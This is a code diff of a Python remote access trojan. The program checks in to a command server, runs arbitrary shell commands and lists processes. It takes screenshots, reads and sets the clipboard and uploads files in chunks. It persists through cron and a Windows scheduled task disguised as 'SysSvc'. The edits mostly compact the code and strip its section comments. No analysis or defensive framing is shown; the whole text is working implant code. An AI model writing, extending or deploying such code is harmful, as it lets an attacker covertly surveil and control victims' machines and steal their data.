@@ -22,17 +22,15 @@ SID = _sid()
 
 def http(path, data=None, timeout=40):
     r = urllib.request.Request(BASE + path, data=data, headers=UA)
-    with urllib.request.urlopen(r, timeout=timeout) as f:
-        return f.read()
+    with urllib.request.urlopen(r, timeout=timeout) as f: return f.read()
 
 def post(o, timeout=40):
     try: http("/r/" + SID, json.dumps(o).encode(), timeout)
     except Exception: pass
 
-def out(rid, txt):
-    post({"t": "out", "id": rid, "d": txt})
-
+def out(rid, txt): post({"t": "out", "id": rid, "d": txt})
 def which(b): return shutil.which(b)
+
 def sh(c, t=90):
     try:
         r = subprocess.run(c, shell=True, capture_output=True, text=True, timeout=t)
@@ -49,8 +47,6 @@ def info():
         d["ip"] = s.getsockname()[0]; s.close()
     except Exception: d["ip"] = "?"
     return d
-
-# ---------- capture ----------
 
 def screen():
     p = os.path.join(tempfile.gettempdir(), "s_%d.png" % time.time())
@@ -95,8 +91,6 @@ def send_file(rid, path):
             i += 1
     post({"t":"file","id":rid,"fid":fid,"name":name,"i":i,"last":True,"size":size})
 
-# ---------- persistence ----------
-
 def persist():
     home = os.path.expanduser("~"); cmd = "%s %s" % (sys.executable, os.path.abspath(__file__))
     r = []
@@ -127,8 +121,6 @@ def unpersist():
         open("/tmp/_c","w").write("\n".join(c) + "\n"); sh("crontab /tmp/_c"); r.append("cron")
     if os.name == "nt": sh('schtasks /delete /tn SysSvc /f'); r.append("schtasks")
     return ", ".join(r) or "none"
-
-# ---------- dispatch ----------
 
 UPS = {}
 
@@ -185,7 +177,6 @@ def handle(m):
         except Exception as e: out(rid, "ERR %s\n" % e)
 
     elif t == "info": out(rid, json.dumps(info(), indent=2) + "\n")
-
     elif t == "ps": out(rid, sh("ps aux" if os.name != "nt" else "tasklist"))
 
     elif t == "shot":
@@ -200,18 +191,15 @@ def handle(m):
 
     elif t == "clip":
         if m.get("op") == "set":
-            for c in ("termux-clipboard-set",):
-                if which(c): sh("%s '%s'" % (c, a.replace("'", ""))); break
-            else:
-                if which("xclip"): sh("echo '%s'|xclip -sel c" % a)
-                elif which("pbcopy"): sh("echo '%s'|pbcopy" % a)
+            if which("termux-clipboard-set"): sh("termux-clipboard-set '%s'" % a.replace("'", ""))
+            elif which("xclip"): sh("echo '%s'|xclip -sel c" % a)
+            elif which("pbcopy"): sh("echo '%s'|pbcopy" % a)
             out(rid, "ok\n")
         else:
             r = ""
-            for c in ("termux-clipboard-get","pbpaste"):
-                if which(c): r = sh(c); break
-            else:
-                if which("xclip"): r = sh("xclip -o -sel c")
+            if which("termux-clipboard-get"): r = sh("termux-clipboard-get")
+            elif which("pbpaste"): r = sh("pbpaste")
+            elif which("xclip"): r = sh("xclip -o -sel c")
             out(rid, r + "\n")
 
     elif t == "toast": sh("termux-toast '%s'" % a); out(rid, "ok\n")
@@ -244,14 +232,11 @@ def handle(m):
 
     elif t == "kill": out(rid, "bye\n"); time.sleep(1); os._exit(0)
 
-# ---------- main ----------
-
 def main():
     back = 2
     while True:
         try:
-            post({"t":"hello","info":info()})
-            break
+            post({"t":"hello","info":info()}); break
         except Exception:
             time.sleep(back); back = min(back * 2, 60)
 
